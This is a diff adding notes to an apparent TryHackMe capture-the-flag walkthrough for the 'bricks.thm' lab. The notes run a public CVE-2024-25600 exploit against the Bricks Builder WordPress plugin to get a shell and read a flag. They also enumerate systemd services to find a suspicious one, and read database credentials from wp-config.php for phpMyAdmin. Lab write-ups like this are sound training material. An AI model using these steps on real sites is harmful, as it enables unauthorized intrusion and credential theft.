@@ -34,6 +34,37 @@ CVE-2024-25600 !!!
 Google: bricks builder 1.9.5 exploit
 >> git clone https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT 
 >> pip install beautifulsoup4 rich prompt_toolkit alive-progress
+>> python CVE-2024-25600.py -u https://bricks.thm
+
+Shell> cat 650c844110baced87e1606453b93f22a.txt
+THM{fl46_650c844110baced87e1606453b93f22a}
+
+https://www.howtogeek.com/839285/how-to-list-linux-services-with-systemctl/
+>> systemctl list-units --type=service --state=running
+::  ubuntu.service                                 loaded active running TRYHACK3M                                                       
+>> systemctl cat ubuntu.service
+# /etc/systemd/system/ubuntu.service
+[...]
+ExecStart=/lib/NetworkManager/nm-inet-dialog
+[...]
+Flag2: nm-inet-dialog
+
+
+>> cat wp-config.php
+
+/** Database username */
+define( 'DB_USER', 'root' );
+
+/** Database password */
+define( 'DB_PASSWORD', 'lamp.sh' );
+
+-> https://bricks.thm/phpmyadmin/
+
+
+
+
+
+
 
 
 
